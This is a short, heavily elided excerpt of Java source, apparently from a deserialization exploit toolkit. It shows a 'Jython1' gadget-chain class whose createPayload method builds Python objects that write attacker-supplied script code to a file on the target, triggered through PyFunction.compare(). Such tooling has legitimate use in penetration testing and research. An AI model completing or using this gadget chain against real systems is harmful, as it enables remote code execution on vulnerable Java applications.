...
@Impact(Impact.PythonScript)
public class Jython1 extends GadgetChain<CompareTrampoline> {

    public Jython1(CompareTrampoline _trampoline) {
        super(_trampoline);
    }
    ...
    protected TrampolineConnector createPayload(String command) throws Exception {
        ...
        BufferedReader reader = new BufferedReader(new InputStreamReader(Files.newInputStream(Paths.get(paths[0])), StandardCharsets.UTF_8));
        ...
        PyObject[] consts = new PyObject[]{new PyString(""), new PyString(paths[1]), new PyString("w+"), new PyString(python_code.toString())};
    ...
    protected String getStackTrace() {
        return "(Proxy) org.python.core.PyFunction.compare()\n"+
